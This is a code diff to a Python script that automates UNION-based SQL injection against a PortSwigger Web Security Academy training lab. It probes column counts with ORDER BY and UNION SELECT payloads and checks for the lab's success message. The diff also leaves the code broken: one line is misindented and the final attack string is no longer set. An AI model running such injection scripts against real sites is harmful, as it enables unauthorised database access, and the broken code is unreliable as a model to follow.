@@ -6,6 +6,7 @@ url = 'https://acf91f5e1e4ce1c080272a03007f00ed.web-security-academy.net/filter?
 sqli_row = ["'+ORDER+BY+",
             "'+UNION+SELECT+"]
 used_attack_r = []
+lab = 2 # enter the lab numner to perform the correct lab check
 nulls = ""
 valid_rows = 0
 final_attack = ""
@@ -45,18 +46,22 @@ def check_columns():
         if r.status_code == 200:
             compatible_col.append(x+1)
             print("Column %s is comaptible" % str(x+1))
-            final_attack = (',').join(s)
-            print(final_attack)
+
 
 def pass_lab_check():
-    print(final_attack.replace("'a'","'SLrvzD'")) #replace with required string
-    r = session.get(url=final_attack.replace("'a'","'SLrvzD'"))
-    if "Congratulations, you solved the lab!" in r.text:
+    if lab == 1:
+        print(final_attack)
+        r = session.get(url=final_attack)
+    elif lab == 2:
+        print(final_attack.replace("'a'","'SLrvzD'")) #replace with required string from lab2
+        r = session.get(url=final_attack.replace("'a'","'SLrvzD'"))#replace with required string from lab2
+            if "Congratulations, you solved the lab!" in r.text:
         print("lab passed")
 
 def main():
     find_rows()
-    check_columns()
+    if lab != 1:
+        check_columns()
     pass_lab_check()
 
 if __name__ == '__main__':
